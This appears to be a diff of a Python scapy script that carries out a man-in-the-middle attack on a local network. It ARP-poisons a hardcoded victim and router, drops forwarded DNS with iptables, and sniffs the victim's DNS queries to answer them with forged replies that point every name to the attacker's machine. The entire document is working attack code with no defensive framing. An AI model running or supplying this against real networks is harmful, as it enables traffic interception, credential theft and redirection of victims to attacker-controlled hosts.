@@ -1,21 +1,28 @@
 #!/usr/bin/python3
 
-import subprocess, os
+import subprocess, os, re
+import threading
 from scapy.all import *
 
-targetIP = "192.168.0.15"
-routerIP = "192.168.0.16"
-localIP = "127.0.0.1"
+domain = "google.ca"
+victimIP = "192.168.0.16"
+routerIP = "192.168.0.100"
+interface = "eno1"
+localIP = "192.168.0.17"
 
-def setIptables():
+def checkRootPrivilege():
+    if os.geteuid() != 0:
+        sys.exit("[!] Please run the script as root.")
+
+def setup():
     # Disable fowarding of DNS request to router
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
     # Add iptables rule to drop any DNS request
-    subprocess.Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=subprocess.PIPE)
 
-def resetIptables():
+def restore():
     # Remoce iptables rule to drop any DNS request
-    subprocess.Popen(["iptables -D FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.Popen(["iptables -D FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=subprocess.PIPE,)
 
 def getLocalMAC(interface):
     mac = ""
@@ -25,68 +32,52 @@ def getLocalMAC(interface):
         mac = "00:00:00:00:00:00"
     return mac[:17]
 
-def getTargetMAC(targetIP):
-    pingResult = subprocess.Popen(["ping", "-c 1", targetIP], stdout=subprocess.PIPE)
-    pid = subprocess.Popen(["arp", "-n", targetIP], stdout=subprocess.PIPE)
-    s = pid.communicate()[0]
-    targetMAC = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
-    return targetMAC
+def getTargetMAC(IP):
+    ans, unans = arping(IP)
+    for s,r in ans:
+        return r[Ether].src
 
-def arpPoison(localMAC, targetMAC, routerMAC):
-    arpPacketTarget = Ether(src=localMAC, dst=targetMAC)/ARP(hwsrc=localMAC, hwdst=targetMAC, psrc=routerIP, pdst=targetIP, op=2)
-    arpPacketRouter = Ether(src=localMAC, dst=routerMAC)/ARP(hwsrc=localMAC, hwdst=routerMAC, psrc=targetIP, pdst=routerIP, op=2)
-    print("ARP Poisoning {}".format(targetIP))
+def arpPoison(routerIP, victimIP, routerMAC, victimMAC):
+    print("Starting ARP poisoning to {}".format(victimIP))
     while True:
-        try:
-            sendp(arpPacketTarget, verbose=0)
-            sendp(arpPacketRouter, verbose=0)
-            # sleep 3 seconds for each sending
-            time.sleep(3)
-        except KeyboardInterrupt:
-            print("Stop ARP poisoning. Closed.")
-            sys.exit(0)
-
-def reply(packet):
-    global targetIP
-    response = IP(dst=targetIP, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
-            DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=targetIP))
-    send(response, verbose=0)
-    print("Sent spoofed DNS packet")
-    return
+        time.sleep(2)
+        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
+        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)
 
 def parsePacket(packet):
-    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
-        replyThread = threading.Thread(target=reply, args=(packet, ))
-        replyThread.start()
+    global localIP
+    if packet.haslayer(DNS) and DNSQR in packet:
+        response = (Ether()/IP(dst=packet[IP].src, src=packet[IP].dst)/\
+                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
+                    DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
+                    an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=localIP)))
+        sendp(response, verbose=0)
 
-def listen():
-    global targetIP
-    print("Start sniffing DNS packets...")
-    mFilter = "udp and port 53 and src " + str(targetIP)
+def listen(victimIP):
+    mFilter = "udp and port 53 and src " + victimIP
     sniff(filter=mFilter, prn=parsePacket)
 
 def main():
-    setIptables()
+    global victimIP
+    global interface
+    global routerIP
+    checkRootPrivilege()
+    setup()
 
-    targetMAC = getTargetMAC(targetIP)
-    localMAC = getLocalMAC("eno1")
+    victimMAC = getTargetMAC(victimIP)
+    localMAC = getLocalMAC(interface)
     routerMAC = getTargetMAC(routerIP)
 
-    arpThread = threading.Thread(target=arpPoison, args=(localMAC, targetMAC, routerMAC))
+    arpThread = threading.Thread(target=arpPoison, args=(routerIP, victimIP, routerMAC, victimMAC))
     arpThread.daemon = True
-    listenThread = threading.Thread(target=listen)
+    listenThread = threading.Thread(target=listen, args=(victimIP,))
     listenThread.daemon = True
 
     arpThread.start()
     listenThread.start()
 
-    while True:
-        try:
-            time.sleep(5)
-        except KeyboardInterrupt:
-            resetIptables()
-            print("Exiting...")
-            sys.exit(0)
+    arpThread.join()
+    listenThread.join()
 
 if __name__ == '__main__':
     main()
